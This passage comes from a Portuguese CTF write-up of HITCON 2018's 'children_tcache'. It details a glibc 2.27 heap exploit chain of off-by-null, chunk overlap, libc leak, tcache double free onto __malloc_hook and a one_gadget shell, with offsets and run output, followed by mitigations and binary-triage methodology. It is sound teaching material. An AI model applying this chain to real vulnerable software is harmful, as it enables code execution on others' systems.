5. A carga útil de `0x108` bytes em `A` dispara o *off-by-null*, corrompendo o campo `size` do `last_remainder` (`0x111` $\to$ `0x100`). Com isso, os metadados em `C` permanecem íntegros e dessincronizados em relação ao tamanho real do bloco anterior.

---

## 7. Estratégia de Exploração Passo a Passo

Abaixo está o fluxo completo do ataque implementado em [`solver/exploit.py`](./solver/exploit.py):

```mermaid
flowchart LR
    A["1. off-by-null<br/>size 0x111 → 0x100"] --> B["free(B) + free(A)<br/>consolida A+B (0x220)"]
    B --> C["malloc(0x108)<br/>split + last_remainder"]
    C --> D["2. free(b1) + free(C)<br/>consolidação retroativa"]
    D --> E["topo em b2<br/>(b2 continua alocado)"]
    E --> F["3. malloc(0x500) cobre b2<br/>free → fd no unsorted"]
    F --> G["show(0)<br/>leak de libc"]
    G --> H["4. tcache dup<br/>__malloc_hook"]
    H --> I["5. one_gadget<br/>shell + flag"]
```



A análise detalhada de cada etapa da exploração é apresentada a seguir.

---

### 7.1 Passo 1 - Preparar o terreno e disparar o *off-by-null* (função [`off_by_null`](./solver/exploit.py#L57-L91))

Seja `X` o endereço onde começa o cabeçalho do chunk `A` na heap (o ponteiro entregue ao usuário pelo `malloc` é `X + 0x10`).

1. **Pré-aquecimento dos cestos `tcache`:** alocamos e liberamos 7 chunks de tamanho de usuário `0x80` (chunk total `0x90`), deixando o `tcache` de `0x90` cheio com 7 blocos para uso futuro. Em seguida, alocamos 7 chunks de `0x100` (chunk total `0x110`) nos índices `0..6` para segurá-los.
2. **Alocação do trio contíguo `A`, `B` e `C`:**
   - Índice `7` = `A`: pedimos `0x108` bytes $\to$ chunk de `0x110` bytes em `X`.
   - Índice `8` = `B`: pedimos `0x100` bytes $\to$ chunk de `0x110` bytes em `X + 0x110`.
   - Índice `9` = `C`: pedimos `0x100` bytes $\to$ chunk de `0x110` bytes em `X + 0x220` (logo antes do `top chunk`).

```
X               X+0x110         X+0x220         X+0x330
┌───────────────┬───────────────┬───────────────┬──────────────
│ A  size=0x111 │ B  size=0x111 │ C  size=0x111 │ top chunk ...
│ (idx 7)       │ (idx 8)       │ (idx 9)       │
└───────────────┴───────────────┴───────────────┴──────────────
```

3. **Encher o `tcache[0x110]` e liberar `B` (índice 8):**
   - Deletamos os índices `0..6` (7 chunks de `0x110`), lotando as 7 vagas do `tcache[0x110]`.
   - Deletamos `B` (`ct.delete(8)`). Como o `tcache[0x110]` está lotado, `B` vai para o **unsorted bin**.
   - Ao colocar `B` no *unsorted bin*, o `free()` avisa o vizinho da frente (`C`) que `B` agora está livre: ele grava **`C.prev_size = 0x110`** e limpa o bit `PREV_INUSE` de `C` (**`C.size` passa de `0x111` para `0x110`**).
4. **Liberar `A` (índice 7) para fundir `A + B`:**
   - Deletamos `A` (`ct.delete(7)`). Como o `tcache[0x110]` continua lotado, `A` também vai ao *unsorted bin*.
   - O `free(A)` detecta que o chunk posterior (`B`, em `X + 0x110`) está livre no *unsorted bin* e realiza uma **consolidação progressiva**, unificando `A` e `B` em um único bloco livre de **`0x220` bytes** (`size = 0x221`) iniciado em `X`.

```
X                               X+0x220         X+0x330
┌───────────────────────────────┬───────────────┬──────────────
│ Bloco livre A+B   size=0x221  │ C  size=0x110 │ top chunk ...
│ (no unsorted bin)             │ prev_sz=0x220 │
└───────────────────────────────┴───────────────┴──────────────
```

5. **Por que fundimos `A + B` antes do *off-by-null*?**
   - Primeiro, esvaziamos o `tcache[0x110]` alocando 7 chunks nos índices `0..6` (para que o próximo `malloc(0x108)` seja obrigado a tirar memória do nosso bloco `A+B` de `0x220` no *unsorted bin*).
   - Agora pedimos `ct.add(0x108, b"A" * 0x108)` (que recebe o índice `7`).
   - O que o `malloc(0x108)` faz ao encontrar o bloco livre de `0x220` no *unsorted bin*?
     1. Ele corta os primeiros `0x110` bytes (em `X`) para devolver como o novo chunk `A`.
     2. Os `0x110` bytes remanescentes (situados em `X + 0x110`, na posição de `B`) permanecem no *unsorted bin* e são registrados como **`last_remainder`**.
     3. Ao configurar o `last_remainder` de `0x110` bytes antes de `C`, o `malloc` regrava `C.prev_size = 0x110` e preserva `C.size = 0x110` (`PREV_INUSE = 0`).
   - Imediatamente após o retorno de `malloc(0x108)`, a execução de `strcpy` transcreve os `0x108` bytes em `A`. O terminador nulo (`\x00`) atinge `X + 0x118` (campo `size` do `last_remainder` `R`), reduzindo-o de `0x111` para **`0x100`**.

```
X               X+0x110                 X+0x210  X+0x220
┌───────────────┬───────────────────────┬────────┬───────────────┐
│ A  size=0x111 │ R (last_remainder)    │ 0x10   │ C  size=0x110 │ → top
│ (idx 7)       │ size=0x100 (adulterado)│ buraco │ prev_sz=0x110 │
└───────────────┴───────────────────────┴────────┴───────────────┘
                       ▲ NUL do strcpy em X+0x118
                         (0x111 → 0x100)
```

> **Estado de dessincronização da heap após o Passo 1:**
> - O cabeçalho de `R` (`last_remainder` em `X + 0x110`) declara tamanho `0x100`, estendendo-se teoricamente apenas até `X + 0x210`.
> - O cabeçalho de `C` (em `X + 0x220`) registra `prev_size = 0x110` e `PREV_INUSE = 0`, apontando como predecessor o endereço `(X + 0x220) - 0x110 = X + 0x110`.
> - Como `R` aparenta terminar em `X + 0x210`, subdivisões subsequentes de `R` não afetam o cabeçalho de `C` em `X + 0x220`, mantendo seus metadados inalterados.

Resumo dos cabeçalhos reais verificados na memória durante o Passo 1:

| Momento | `A` (`X`) | `R` / `B` (`X+0x110`) | `C` (`X+0x220`) |
|---|---|---|---|
| Após alocar `A`, `B`, `C` | `size=0x111` | `size=0x111` | `size=0x111` |
| Após `free(B)` | `size=0x111` | (no *unsorted bin*) | `prev_size=0x110`, `size=0x110` (`P=0`) |
| Após `free(A)` (consolida `A+B`) | `size=0x221` | (parte do bloco `A+B`) | `prev_size=0x220`, `size=0x110` (`P=0`) |
| Após `malloc(0x108)` + *off-by-null* | `size=0x111` | **`size=0x100`** (`last_remainder`) | **`prev_size=0x110`, `size=0x110` (`P=0`)** |

Por fim, deletamos novamente os 7 chunks `0..6` para deixar o `tcache[0x110]` cheio e os slots `0..6` do menu vagos para o Passo 2.

---

### 7.2 Passo 2 - Dividir o `last_remainder` sem `unlink` e criar a sobreposição (função [`build_overlap`](./solver/exploit.py#L94-L122))

Agora temos o `last_remainder` `R` em `X + 0x110` com tamanho falsificado `0x100`. Queremos dividi-lo em dois chunks menores:
- **`b1`** de `0x90` bytes (em `X + 0x110`).
- **`b2`** de `0x70` bytes (em `X + 0x1a0`), satisfazendo `0x90 + 0x70 = 0x100`.

Veja como fazemos isso:

1. **Consumir o `tcache[0x90]` e alocar `b1` (`0x80` bytes de usuário $\to$ chunk `0x90`):**
   - Alocamos 7 chunks de `0x80` nos índices `0..6` para esvaziar o `tcache[0x90]`.
   - Pedimos mais um `ct.add(0x80, b"b1")` no **índice 8**.
   - Como o `tcache[0x90]` acabou de esvaziar, o `_int_malloc` olha para o *unsorted bin* e vê o `last_remainder` `R` (que ele acredita ter `0x100` bytes).
   - **Divisão via `last_remainder` sem `unlink`:** Como `R` coincide com `av->last_remainder` e seu tamanho (`0x100`) é suficiente para atender à requisição de `0x90` bytes, o alocador divide o bloco diretamente sem invocar a macro `unlink`. Os primeiros `0x90` bytes (`X + 0x110`) são alocados para `b1`, e os `0x70` bytes remanescentes (`X + 0x1a0 .. X + 0x210`) permanecem no *unsorted bin*.
2. **Alocar `b2` (`0x60` bytes de usuário $\to$ chunk `0x70`) no índice 0:**
   - Deletamos os 7 chunks de `0x80` dos índices `0..6` (enchendo de volta o `tcache[0x90]` e liberando os slots `0..6`).
   - Pedimos `ct.add(0x60, b"b2")`, que ocupa o **índice 0**.
   - Essa requisição de `0x70` bytes consome exatamente a sobra de `0x70` bytes situada em `X + 0x1a0`.
   - Como `b2` possui `0x70` bytes e inicia em `X + 0x1a0`, seu término ocorre em `X + 0x210`. O alocador atualiza a flag `PREV_INUSE` em `X + 0x210` (no intervalo residual de `0x10` bytes), mantendo o chunk `C` (em `X + 0x220`) inalterado com `C.PREV_INUSE = 0` e `C.prev_size = 0x110`.

Veja como ficou o mapa da heap neste momento:

```
X+0x110          X+0x1a0          X+0x210  X+0x220
┌────────────────┬────────────────┬────────┬───────────────┬──────────────
│ b1  size=0x91  │ b2  size=0x71  │ 0x10   │ C  size=0x110 │ top chunk ...
│ (idx 8)        │ (idx 0)        │ buraco │ prev_sz=0x110 │
└────────────────┴────────────────┴────────┴───────────────┴──────────────
```

3. **Preparar `b1` para o `unlink` legítimo e acionar a consolidação retroativa:**
   - Para viabilizar a consolidação retroativa a partir de `C` sem falhas na macro `unlink`, `b1` precisa estar livre no *unsorted bin* com ponteiros `fd`/`bk` consistentes e `b2.prev_size == 0x90`.
   - Executa-se `ct.delete(8)` (`free(b1)`). Com o `tcache[0x90]` saturado, `b1` é inserido diretamente no *unsorted bin*, registrando `b2.prev_size = 0x90`.
   - Liberação de `C` via **`ct.delete(9)`**:
     1. Com o `tcache[0x110]` saturado, `free(C)` encaminha o chunk ao processamento padrão.
     2. Ao examinar o cabeçalho de `C` (`size = 0x110`), identifica-se `PREV_INUSE == 0`.
     3. O alocador lê `C.prev_size` (`0x110`) e calcula o início do chunk predecessor:
        $$\mathtt{(X + 0x220) - 0x110 = X + 0x110} \quad (\mathtt{b1})$$
     4. A rotina invoca `unlink(b1)`. Como `b1` declara tamanho `0x90` e o chunk seguinte (`b2`) registra `prev_size = 0x90`, a checagem `chunksize(b1) == prev_size(b2)` é satisfeita com sucesso.
     5. Por estar adjacente ao *top chunk*, `free(C)` consolida `b1`, `b2`, o remanescente e `C` diretamente com o *top chunk*, recuando o início do *top chunk* para `X + 0x110`.

```
Top chunk consolidado recua para X+0x110
┌─────────────────────────────────────────────────────────────────────────┐
│ top chunk (campo size = 0x20141; chunk = 0x20140)                       │
│  ┌────────────────┬───────────────────────┬────────┬─────────────────┐  │
│  │ b1 (0x90)      │ b2 (0x70) - slot 0    │ 0x10   │ C (absorvido)   │  │
│  │ (livre no top) │ (permanece alocado)   │ buraco │                 │  │
│  └────────────────┴───────────────────────┴────────┴─────────────────┘  │
└─────────────────────────────────────────────────────────────────────────┘
```

4. **Alinhar o `top chunk` exatamente na cabeça de `b2` (índice 0):**
   - O `top chunk` está em `X + 0x110` (`b1`), que fica `0x90` bytes antes de `b2` (`X + 0x1a0`).
   - Esvaziamos o `tcache[0x90]` (alocando 7 chunks de `0x80` nos índices `1..6` e `8` — o `0` é `b2`, o `7` é `A` e o `9` é `b1`) e fazemos mais uma alocação de `0x80` (`ct.add(0x80, b"b1")` no índice `9`).
   - Essa última alocação recorta exatamente os primeiros `0x90` bytes do `top chunk` (`b1`), deslocando a base do **`top chunk` para coincidir com o cabeçalho de `b2` (`X + 0x1a0`)**.
   - Os chunks temporários são liberados para restaurar a disponibilidade dos slots de gerenciamento.

| Momento | `b1` (`X+0x110`) | `b2` (`X+0x1a0`, slot 0) |
|---|---|---|
| Após split do `last_remainder` | `size=0x91` | `size=0x71` |
| Após `free(b1)` | `size=0x91` (no *unsorted*) | `prev_size=0x90`, `size=0x71` |
| Após `free(C)` (consolidação retroativa) | `top chunk` (`campo size=0x20141`) | `size=0x71` (alocado no slot 0, contido no *top chunk*) |
| Após realocar `b1` | `size=0x91` | `top chunk` (`campo size=0x200b1`) alinhado na base de `b2` |

Ao término do Passo 2, `heap_list[0]` referencia a área de dados em `X + 0x1b0`, correspondente à base útil do *top chunk*. Qualquer requisição subsequente atendida pelo *top chunk* sobreporá este mesmo endereço.

---

### 7.3 Passo 3 - Vazamento de endereço da `libc` (*Info Leak*) (função [`leak_libc`](./solver/exploit.py#L124-L140))

Com o *top chunk* alinhado à base de `b2` (slot 0), é possível induzir a sobreposição com um chunk de grande porte destinado ao *unsorted bin*:

1. **Alocação de chunk de grande porte (`0x500` bytes):**
   - A chamada `ct.add(0x500, b"x")` ocupa o índice 1.
   - O alocador atende a requisição recortando o espaço diretamente do *top chunk* (iniciado em `X + 0x1a0`).
   - Dessa forma, `heap_list[0]` e `heap_list[1]` apontam para o mesmo endereço de dados (`X + 0x1b0`), agora sob a ótica de um chunk de `0x510` bytes (`size = 0x511`).
2. **Alocação de chunk de guarda (`0x120` bytes no índice 2):**
   - Previne que a subsequente liberação do índice 1 consolide com o restante do *top chunk*, forçando seu encaminhamento ao *unsorted bin*.
3. **Liberação do índice 1 (`free` do bloco de `0x510` bytes):**
   - A chamada `ct.delete(1)` libera o chunk. Como requisições de `0x510` bytes excedem o limite de `0x410` bytes do `tcache`, o bloco é inserido diretamente no *unsorted bin*.
   - Embora o `delete_heap` execute `memset(..., 0xda, 0x500)`, a invocação imediata de `free()` sobrescreve os primeiros 16 bytes da área útil com os ponteiros `fd` e `bk` direcionados à `main_arena` da `libc`.
4. **Leitura do ponteiro `fd` via `Show heap` (índice 0):**
   - O índice 0 permanece ativo referenciando o mesmo endereço de memória (`X + 0x1b0`).
   - A operação `Show heap` no índice 0 (`puts(heap_list[0])`) emite os bytes correspondentes ao ponteiro `fd` até o terminador nulo nos bytes superiores:

```
X+0x1a0         X+0x1b0 (heap_list[0] referencia este endereço)
┌───────────────┬────────────────────────┬────────────────────────┬────────────
│ size = 0x511  │ fd = main_arena + 0x60 │ bk = main_arena + 0x60 │ 0xdadada...
└───────────────┴────────────────────────┴────────────────────────┴────────────
                 ▲
                 └── show(0) emite estes 6 bytes do endereço da libc
```

Na `libc.so.6` fornecida no desafio (`Ubuntu GLIBC 2.27-3ubuntu1`), o deslocamento de `main_arena + 0x60` a partir do início da `libc` é sempre **`0x3ebca0`**. Logo:
$$\mathtt{libc\_base} = \mathtt{u64(leak)} - \mathtt{0x3ebca0}$$

Em uma execução típica:
```
leak = 0x783d715ebca0  ->  libc base = 0x783d71200000
```
Como todo carregamento de biblioteca pelo kernel Linux é alinhado em páginas de 4 KB (`0x1000`), conferimos `assert base & 0xfff == 0`.

---

### 7.4 Passo 4 - *Tcache Dup* (Double Free) e Escrita em `__malloc_hook` (função [`tcache_dup`](./solver/exploit.py#L142-L157))

Com o endereço base da `libc` conhecido, obtêm-se as posições absolutas de `__malloc_hook` (`libc_base + 0x3ebc30`) e do `one_gadget` (`libc_base + 0x4f322`). A sobreposição existente é então convertida em uma primitiva de escrita arbitrária via *double free* no `tcache`:

1. **Geração de referências duplicadas para chunk de `0x130` bytes:**
   - Com o bloco livre de `0x510` bytes no *unsorted bin* (iniciado em `X + 0x1a0`), a chamada `ct.add(0x120, b"1111")` aloca um chunk de `0x130` bytes no índice 1.
   - Ambos os índices 0 e 1 passam a apontar para o mesmo chunk (`X + 0x1b0`).
2. **Execução de Double Free no `tcache[0x130]`:**
   - Liberação do índice 0 (`ct.delete(0)`): O chunk é inserido no `tcache[0x130]`, e a lista fica `tcache[0x130] → Chunk_X → NULL`.
   - Liberação do índice 1 (`ct.delete(1)`): Como o índice 1 referencia o mesmo `Chunk_X` e a `glibc 2.27` não dispõe do campo de verificação `key`, o alocador reinsere `Chunk_X` na cabeça da lista, estabelecendo uma referência circular: `tcache[0x130] → Chunk_X → Chunk_X`.
3. **Envenenamento da lista do tcache (*Tcache Poisoning*):**
   - **1ª alocação de `0x120` (`ct.add(0x120, p64(hook))`):** O alocador retorna `Chunk_X`. A escrita grava os 6 bytes significativos do endereço de `__malloc_hook` no campo `next` do chunk livre subsequente: `tcache[0x130] → Chunk_X → __malloc_hook`.
   - **2ª alocação de `0x120` (`ct.add(0x120, b"aaaa")`):** Retira a segunda referência a `Chunk_X`, posicionando `__malloc_hook` no topo da lista: `tcache[0x130] → __malloc_hook`.
   - **3ª alocação de `0x120` (`ct.add(0x120, p64(gadget_addr))`):** O alocador retorna diretamente o ponteiro correspondente a `__malloc_hook`. A chamada `strcpy` grava o endereço de `gadget_addr` no alvo.

```
Evolução da lista tcache[0x130]:
  Após delete(0):          [cabeça] ──► Chunk_X ──► NULL
  Após delete(1) (dup):    [cabeça] ──► Chunk_X ──► Chunk_X (ciclo)
  1º add(0x120, hook):     [cabeça] ──► Chunk_X ──► __malloc_hook
  2º add(0x120, "aaaa"):   [cabeça] ──► __malloc_hook
  3º add(0x120, gadget):   *( __malloc_hook ) = one_gadget
```

---

### 7.5 Passo 5 - Acionar `__malloc_hook` e abrir a Shell

Na `libc.so.6` deste desafio, os candidatos usuais de `one_gadget` são `0x4f2c5`, `0x4f322` e `0x10a38c`; o script testa `0x4f322` e, se necessário, `0x10a38c`. O primeiro é o offset **`0x4f322`**, cuja condição de ativação depende do registrador de ponteiro de pilha **SP (`rsp`)**:

```
0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL
```

Ao acionar a opção `"1. New heap"` com qualquer tamanho (`Size: 123`), a função `malloc(123)` detecta que o ponteiro `__malloc_hook` não é nulo e redireciona o fluxo de execução diretamente para `libc_base + 0x4f322`, substituindo a imagem do processo por `/bin/sh`.

Saída da execução do exploit completo ([`solver/exploit.py`](./solver/exploit.py)):

```
$ python3 solver/exploit.py
[*] tentando one_gadget 0x4f322
[1] off-by-null: size do remainder 0x111 -> 0x100
[2] consolidacao retroativa: topo movido para b1; b2 ficou sobreposto
[2] topo posicionado em b2 (idx 0), que segue alocado
[3] leak = 0x783d715ebca0  ->  libc base = 0x783d71200000
[4] tcache dup: __malloc_hook <- 0x783d7124f322
[5] shell obtida; flag: hitcon{...}
```

**Sobre a flag:** o servidor remoto original do HITCON CTF 2018 não está mais ativo, e o ambiente do *pwn.college* executa desafios em contêineres próprios. A reprodução local espera um arquivo `flag` na raiz do repositório, criado pelo leitor com a flag histórica oficial documentada nos write-ups de referência; o valor é omitido aqui de propósito, e o arquivo não é versionado. O exploit inicia o processo com `cwd` na raiz do repositório e envia `cat flag; echo __END__` ao shell; no servidor original o caminho era `/home/children_tcache/flag`.

---

### 7.6 Sutilezas de engenharia que surgiram na implementação (e como foram resolvidas)

Ao construir o exploit sem `pwntools`, falando diretamente com os *pipes* do processo Linux, quatro detalhes práticos de baixo nível são determinantes para que o exploit tenha 100% de confiabilidade:

1. **Coalescência de bytes no *pipe* do Linux:** a função `get_num()` do binário faz um único `read(0, buf, 0x10)` para ler o tamanho pedido no menu. Quando enviávamos `"123\n"` e imediatamente o comando de leitura da flag na mesma rajada pelo *pipe*, o `read()` de 16 bytes do `get_num()` engolia os primeiros 16 bytes (`"123\ncat flag..."`), deixando para o `/bin/sh` apenas o resto truncado da linha (`"ho __END__\n"`), o que gerava o erro `/bin/sh: 1: ho: not found`.
   - **Correção:** aguardar `time.sleep(0.3)` após enviar `"123\n"` para que o `get_num()` termine, o `malloc(123)` acione o `__malloc_hook` e o `/bin/sh` já esteja pronto esperando comandos no `stdin`. Pelo mesmo motivo, no harness ([`solver/probe.py`](./solver/probe.py)), toda operação espera o prompt `"Your choice: "` antes de enviar o próximo comando.
2. **Como gravar ponteiros de 8 bytes usando `strcpy` (que para em `\x00`)?**
   - Endereços de espaço de usuário no Linux x86-64 (tanto da heap quanto da `libc`, como `0x0000783d7124f322`) têm **6 bytes significativos** e os **2 bytes mais altos iguais a `0x0000`**.
   - Em arquiteturas little-endian x86-64, os 6 bytes significativos de um endereço de espaço de usuário residem nos bytes inferiores. O `strcpy` copia os 6 bytes do ponteiro e posiciona o `\0` no 7º byte. A operação é segura pois os bytes 6 e 7 de destino já se encontram zerados (`__malloc_hook` inicializado em `NULL` e ponteiro `next` do `tcache` com bytes superiores nulos).
3. **Como ler o leak com `puts` sem quebrar se houver byte `0x0a` (`\n`)?**
   - O `puts` imprime até encontrar `\x00` e adiciona um `\n` no final, seguido do banner `$$$$$$$$...`. Se lêssemos apenas até o primeiro `\n`, um endereço aleatório de ASLR que contivesse o byte `0x0a` no meio truncaria a leitura. Por isso, [`leak_libc`](./solver/exploit.py#L124-L140) lê até a sequência `b"\n$"` (a quebra de linha do `puts` colada no primeiro `$` do menu) e valida o alinhamento de página (`base & 0xfff == 0`).
4. **Quando enviar `\n` ou não enviar `\n` no `Data:`?**
   - Na função [`ChildrenTcache.add`](./solver/probe.py#L56-L64), se `len(data) == size` (caso do *off-by-null* com `0x108` bytes), enviamos **exatamente os `size` bytes sem `\n`**, pois o `__read_chk(0, buf, size, size)` retorna imediatamente ao atingir `size` bytes lidos. Para qualquer entrada menor que `size`, adicionamos `b"\n"` para que o loop de leitura de `get_str` pare no `\n` e o troque por `\0`.

---

## 8. Mitigação: como corrigir a falha

A causa raiz é a combinação `read` limitado + `strcpy` sem limite. Correções possíveis:

1. **Reservar espaço para o NUL e copiar apenas o que foi lido:**
   ```c
   char *dest = malloc(size + 1);
   ssize_t n = read(0, buf, size);
   if (n <= 0) exit(1);
   memcpy(dest, buf, n);
   dest[n] = '\0';
   ```
   Alternativa com `strncpy`: `strncpy(dest, buf, size); dest[size - 1] = '\0';` (exige `size > 0` e trunca o último caractere quando a entrada enche o buffer).
2. **Não usar `strcpy` em dados não confiáveis.** Compilar com `_FORTIFY_SOURCE=2` teria trocado a chamada por `__strcpy_chk`; neste binário só `__read_chk` está presente, então a cópia passou sem checagem.
3. **Validar tamanho e índice** — o binário já faz isso (`exit(-2)` para tamanho e `exit(-3)` para índice); o problema não é a validação de índice, é a cópia.

**Por que o exploit não funciona em `glibc` moderna:**

| Versão | Mudança que quebra o exploit |
|---|---|
| 2.29 | campo `key` no `tcache` detecta o *double free* |
| 2.32 | *safe-linking* codifica o `next` (o `fd` envenenado vira endereço inválido) |
| 2.34 | `__malloc_hook`/`__free_hook` removidos; não há alvo trivial de escrita |

A lição central: o off-by-null de 1 byte só vira execução de código porque a versão do alocador permite encadear consolidação, sobreposição, leak e *tcache dup*. Em uma implementação corrigida, o NUL nunca sai do chunk.

---

## 9. Estrutura do repositório

```
.
├── README.md               # este write-up completo
├── run.sh                  # executa o binário com a glibc 2.27 fixada
├── challenge/
│   ├── children_tcache     # handout original (ELF 64-bit)
│   ├── libc.so.6           # handout original (Ubuntu GLIBC 2.27-3ubuntu1)
│   ├── ld-2.27.so          # loader dinâmico do mesmo build
│   └── SHA256SUMS          # hashes de verificação de integridade
└── solver/
    ├── probe.py            # harness sem dependências + inspeção direta de /proc/<pid>/mem
    └── exploit.py          # exploit completo, somente stdlib
```

---

## 10. Metodologia de engenharia reversa: como o write-up foi reconstruído

A análise partiu do **handout**, e exploits públicos serviram apenas de conferência, nunca de fonte de evidência. As Seções 6 e 7 mostram o resultado (vulnerabilidade e cadeia de exploração), enquanto esta seção mostra o método: um ciclo curto e repetido de *formular hipótese → extrair evidência do binário → confirmar com um experimento controlado na heap*. O objetivo é permitir que outra pessoa refaça a análise do zero e chegue às mesmas conclusões.

### 10.1 Inventário e triagem estática

Primeiro, tratar o handout como evidência: identificar o arquivo, as proteções e as dependências antes de ler qualquer instrução.

```bash
cd challenge
sha256sum children_tcache libc.so.6 ld-2.27.so   # integridade
readelf -h children_tcache                        # ELF64, PIE (Type: DYN), entry point
readelf -lW children_tcache                       # INTERP, GNU_RELRO, GNU_STACK
readelf -d children_tcache                        # BIND_NOW (Full RELRO), NEEDED
readelf -sW children_tcache                       # imports dinâmicos
strings -a children_tcache                        # menu, "Timeout", "read error"
```

O que essa triagem entrega:

| Evidência | Conclusão para o write-up |
|---|---|
| `Type: DYN` + `INTERP` | binário PIE, onde os endereços só fazem sentido como offsets |
| `GNU_RELRO` + `BIND_NOW` | Full RELRO, logo a GOT não é alvo de escrita |
| `GNU_STACK ... RW` | NX ativo, impedindo a execução de shellcode na pilha |
| imports `strcpy`, `__read_chk`, `memset`, `malloc`, `free`, `atoll` | pista do fluxo: leitura limitada + cópia sem limite |
| `strings` com o menu | confirma as quatro operações e o formato da interface |

A presença de `__read_chk` **sem** `__strcpy_chk` já é a pista central: a leitura é limitada ao tamanho pedido, mas a cópia para o chunk não é. O import de `memset` sugere a limpeza com `0xda` no `delete`, e o de `atoll` indica a conversão de tamanho e índice.

#### 10.1.1 Outras formas de detectar as proteções

`readelf` não é a única via. Há três famílias de verificação, e todas leem os mesmos campos do ELF: o cabeçalho (`e_type`), os *program headers* (`PT_INTERP`, `PT_GNU_STACK`, `PT_GNU_RELRO`), a seção dinâmica (`DT_FLAGS`, `DT_FLAGS_1`, `DT_BIND_NOW`) e a tabela de símbolos dinâmicos (`__stack_chk_fail`, `__*_chk`).

**1. Ferramentas dedicadas (se instaladas).** Neste ambiente nenhuma delas está disponível (`checksec`, `pwn` do pwntools, `rabin2` do rizin/radare2 e `hardening-check` não estão no `PATH`), mas em uma máquina com elas os comandos seriam:

```bash
checksec --file=./children_tcache          # relro, canary, nx, pie, fortify
pwn checksec ./children_tcache             # idêntico, via pwntools
rabin2 -I ./children_tcache                # campos pic/relro/canary/nx/fortify
hardening-check --verbose ./children_tcache
```

Nenhuma delas "descobre" nada além do que o `readelf` mostra: são atalhos de leitura dos mesmos metadados.

**2. Outros utilitários binutils.** Alternativa ao `readelf`, verificável neste ambiente:

```bash
objdump -f children_tcache | grep -E 'file format|flags'
# flags ... DYNAMIC  -> ET_DYN; com INTERP, é executável PIE

objdump -p children_tcache | grep -E 'INTERP|STACK|RELRO|BIND_NOW|FLAGS'
# STACK ... RW        -> NX (pilha não executável)
# RELRO ...           -> PT_GNU_RELRO presente
# FLAGS 0x8           -> DF_BIND_NOW (Full RELRO)
# FLAGS_1 0x8000001   -> NOW | PIE

objdump -T children_tcache | grep -E '__stack_chk_fail|_chk'
# __stack_chk_fail -> canary ; __read_chk sem __strcpy_chk -> FORTIFY parcial

readelf -dW children_tcache | grep -E 'BIND_NOW|FLAGS_1'
# Flags: NOW PIE
```

O `objdump` mostra os flags em hexadecimal, enquanto o `readelf` os traduz (`NOW PIE`). A conclusão é a mesma.

**3. Verificação em tempo de execução (a definitiva).** Os headers dizem o que o ELF *pede*, e `/proc/<pid>/maps` mostra o que o kernel *concedeu*. Como o processo precisa ficar vivo esperando entrada, o jeito portátil é abri-lo por um script curto executado com `python3` (o mesmo método usado por [`solver/probe.py`](./solver/probe.py)):

```python
import os, subprocess, time

root = os.getcwd()
p = subprocess.Popen(
    [f"{root}/challenge/ld-2.27.so", "--library-path", f"{root}/challenge",
     f"{root}/challenge/children_tcache"],
    stdin=subprocess.PIPE, stdout=subprocess.PIPE,
    cwd=f"{root}/challenge")
time.sleep(0.2)
maps = open(f"/proc/{p.pid}/maps").read().splitlines()
print("\n".join(l for l in maps if "[stack]" in l or "children_tcache" in l))
print("rwx:", [l for l in maps if l.split()[1] == "rwxp"] or "nenhum")
p.kill()
```

Saída observada nesta reprodução (linhas filtradas):

```
7ffdc27a6000-7ffdc27c8000 rw-p ... [stack]
760f4b800000-760f4b802000 r-xp ... children_tcache
760f4b802000-760f4ba01000 ---p ... children_tcache
760f4ba01000-760f4ba02000 r--p ... children_tcache   <- página de RELRO/GOT
760f4ba02000-760f4ba03000 rw-p ... children_tcache
rwx: nenhum
```

O que cada linha prova:

| Observação | Proteção confirmada |
|---|---|
| `[stack]` com `rw-p` e nenhuma linha `rwx` | NX em execução |
| binário carregado em `0x760f4b800000` (base aleatória), não em `0x400000` | PIE em execução |
| página `r--p` do RELRO separada da página `rw-p` de dados | Full RELRO: o GOT fica somente leitura após as relocações |

**Cuidados ao interpretar cada heurística:**

- `ET_DYN` sozinho pode ser uma biblioteca compartilhada, e para afirmar “executável PIE” é preciso exigir também `PT_INTERP`.
- `PT_GNU_RELRO` sozinho é **Partial RELRO**, enquanto Full RELRO exige `BIND_NOW` (`DF_BIND_NOW` ou `DF_1_NOW`) e o GOT inteiro dentro do segmento RELRO.
- `checksec`/`hardening-check` marcam “FORTIFY: Enabled” pela presença de qualquer símbolo `__*_chk`. Neste binário só existe `__read_chk`, e o `strcpy` continua sem checagem. **Não** conclua que todas as cópias são seguras.
- A ausência de `PT_GNU_STACK` é ambígua (caso legado), de modo que não se infere NX pela ausência.
- Com `gdb` + pwndbg/gef instalados existe ainda `checksec` dentro do depurador e `info proc mappings`, mas como aqui o `gdb` não está disponível, a rota usada foi `/proc`.

### 10.2 Localizar `main` em um binário stripped

Sem `.symtab`, o caminho é partir do ponto de entrada e seguir a convenção de inicialização do glibc:

```bash
readelf -h children_tcache | grep Entry          # Entry point: 0x9c0
objdump -d -M intel --start-address=0x9c0 --stop-address=0xa00 children_tcache
```

Em `0x9c0` está `_start`. A instrução decisiva é:

```
9dd: lea rdi,[rip+0x5e4]   # 0xfc8  <-- primeiro argumento de __libc_start_main
9e4: call QWORD PTR [rip+...]       # __libc_start_main(main, argc, argv, ...)
```

Logo, **`main = 0xfc8`**. A partir daí, o desmonte de `main` revela o `switch` das escolhas:

| Escolha | Chamada | Função |
|---|---|---|
| 1 | `0x101d: call 0xcb7` | `new_heap` |
| 2 | `0x1029: call 0xe4b` | `show` |
| 3 | `0x1035: call 0xec9` | `delete` |
| 4 | `0x1041: call _exit` | saída |

`main` também chama `0xaeb` (inicialização: `setvbuf`, `signal(14)`, `alarm(60)`) e `0xc3f` (banner). O grafo reconstruído é:

```
main (0xfc8)
├── init (0xaeb)        setvbuf, signal(SIGALRM), alarm(60)
├── banner (0xc3f)      puts do menu
├── get_num (0xb67)     __read_chk(0, buf, 0x10, 0x11) + atoll
├── new_heap (0xcb7) ── get_str (0xbc8)
├── show (0xe4b)        puts(slot)
└── delete (0xec9)      memset(ptr, 0xda, size) + free + zera slot
```

### 10.3 Reconstruir cada função a partir do desmonte

O critério consiste em correlacionar diretamente cada instrução desmontada ou chamada de biblioteca ao comportamento documentado. Por exemplo, em `new_heap`:

```
0xd4a: cmp [rbp-0x2028], 0x2000   ; limite de tamanho
0xd6b: call malloc                 ; aloca o chunk
0xdb1: call get_str                ; lê até `size` bytes
0xdca: call strcpy                 ; copia a entrada para o chunk  <-- bug
0xded: data_list[i] = dest
0xe0f: size_list[i] = size
```

Em `get_str` (`0xbc8`):

```
